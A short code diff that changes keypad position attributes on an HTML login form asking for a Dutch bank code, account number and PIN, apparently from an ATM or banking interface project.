@@ -16,8 +16,8 @@
         <!-- Login -->
     <div id="login_form_div">
         <form action="waarnaartoe.php" method="POST" name="loginForm">
-            <input type="text" name="UserInfo" data-role="keypad" data-position="" placeholder="BankCode + Account Nummer" data-keys="INGB ,ABNA , RABO , ASNB , NL, 0,1,2,3,4,5,6,7,8,9, , , " data-key-length="18">
-            <input type="password" name="Pin" data-role="keypad" placeholder="Enter pin" data-key-length="4">
+            <input type="text" name="UserInfo" data-role="keypad" data-position="bottom-right" placeholder="BankCode + Account Nummer" data-keys="INGB ,ABNA , RABO , ASNB , NL, 0,1,2,3,4,5,6,7,8,9, , , " data-key-length="18">
+            <input type="password" name="Pin" data-role="keypad" data-position="fml" placeholder="Enter pin" data-key-length="4">
             <button name="login" id="login" placeholder="Login" value="Login">Login</button>
             
         </form>
